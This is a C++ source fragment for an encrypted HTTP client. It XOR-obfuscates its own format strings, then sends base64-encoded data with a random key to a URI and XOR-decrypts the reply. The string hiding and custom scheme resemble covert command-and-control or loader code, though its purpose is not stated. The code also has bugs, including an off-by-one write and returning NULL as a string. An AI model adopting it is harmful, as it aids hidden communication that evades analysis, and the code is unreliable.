

FUNC_NOINLINE void XorString(char* Input, char* Key, unsigned int Size)
{
	int Keylen = strlen(Key);
	for(unsigned int i = 0; i < Size; i++)
		Input[i] = Input[i] ^ Key[i % Keylen];
	Input[Size] = '\0';
}

typedef struct _NPRESPONSE{
	char Multiplier[2];
	BYTE EncryptedResponse[1];

} NPRESPONSE, *PNPRESPONSE;

string ProcessHTTPRequest(char *RequestURI, char *data, char *StaticKey = "")
{
	string DecryptedResponse = "";
	int   RequestKey = GenerateRandomNumber(500,10000);
	char ResponseKey[100];
	memset(ResponseKey, 0, 100);

	sprintf(data,/*%s;%d*/XorStr<0x8C,6,0xAF5D0AFD>("\xA9\xFE\xB5\xAA\xF4"+0xAF5D0AFD).s,data,RequestKey);

	std::string encodedData = base64_encode(reinterpret_cast<const unsigned char*>(data), strlen(data));

	CNetHTTP* Request = new CNetHTTP("POST", RequestURI);
	Request->AddParameter("d", encodedData);
	Request->Run();

	if(Request->ResponseCode == 200){
		std::string decoded = base64_decode(Request->ResponseBodyString);
		NPRESPONSE *pResponse = (NPRESPONSE*)(decoded.c_str());
		int Multiplier = atoi(pResponse->Multiplier);
		if(Multiplier == NULL)return NULL;
		sprintf(ResponseKey,/*%d%s*/XorStr<0xC4,5,0xE92BC080>("\xE1\xA1\xE3\xB4"+0xE92BC080).s,RequestKey * Multiplier, StaticKey);

		for(unsigned int i = 0; i<decoded.length()-2; i++)
			DecryptedResponse += pResponse->EncryptedResponse[i] ^ ResponseKey[i % strlen(ResponseKey)];
	} 

	Request->Cleanup();


	return DecryptedResponse;

}
